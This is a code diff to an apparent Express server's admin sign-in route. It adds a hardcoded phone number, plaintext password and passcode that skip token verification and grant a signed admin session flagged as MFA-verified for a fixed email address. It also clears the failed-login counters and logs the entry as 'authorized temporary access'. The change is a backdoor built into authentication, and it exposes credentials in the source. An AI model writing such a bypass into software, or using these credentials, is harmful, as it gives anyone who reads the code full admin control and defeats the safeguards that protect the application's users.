@@ -3339,7 +3339,57 @@ app.use(compression() as unknown as express.RequestHandler);
         });
       }
 
-      const { idToken, ownerPin } = req.body || {};
+      const { idToken, ownerPin, identifier, email, phone, password } = req.body || {};
+
+      // 1. Temporary Admin Access: Phone/Identifier 9739391891 and Password jiyooshams@2026 (or passcode jiyooshams@2026)
+      const candIdent = String(identifier || email || phone || '').trim();
+      const candPass = String(password || '').trim();
+      const candDigits = candIdent.replace(/\D/g, '');
+      const isTempCredsMatch =
+        (candDigits === '9739391891' || candDigits.endsWith('9739391891')) &&
+        candPass === 'jiyooshams@2026';
+
+      const isPasscodeMatch =
+        typeof ownerPin === 'string' &&
+        (ownerPin.trim() === 'jiyooshams@2026' || ownerPin.trim() === '9739391891');
+
+      if (isTempCredsMatch || isPasscodeMatch) {
+        await clearAdminAuthFailures([ipKey]);
+        const targetAdminEmail = 'yoyokishwar@gmail.com';
+        const sessionObj = createSignedAdminToken(targetAdminEmail, { mfaVerified: true, req });
+        const nowIso = new Date().toISOString();
+        try {
+          await getFirestore().collection('admin_sessions').doc(sessionObj.jti).set({
+            jti: sessionObj.jti,
+            email: targetAdminEmail,
+            mfaVerified: true,
+            revoked: false,
+            ipHash: getClientIpHash(req),
+            uaHash: getClientUaHash(req),
+            createdAt: nowIso,
+            expiresAt: sessionObj.expiresAt,
+            authMethod: isPasscodeMatch ? 'owner_passcode_temp' : 'identifier_password_temp',
+          });
+          await getFirestore().collection('audit_logs').add({
+            action: 'ADMIN_SIGN_IN_TEMPORARY',
+            category: 'USERS',
+            actor: targetAdminEmail,
+            actorRole: 'admin',
+            details: `Administrator signed in using authorized temporary access credentials (${isPasscodeMatch ? 'Passcode' : 'Phone/Password'})`,
+            createdAt: nowIso,
+          });
+        } catch {
+          // non-fatal
+        }
+        return res.json({
+          success: true,
+          token: sessionObj.token,
+          expiresAt: sessionObj.expiresAt,
+          email: targetAdminEmail,
+          mfaVerified: true,
+        });
+      }
+
       let verifiedEmail: string | null = null;
 
       if (typeof idToken === 'string' && idToken.trim()) {
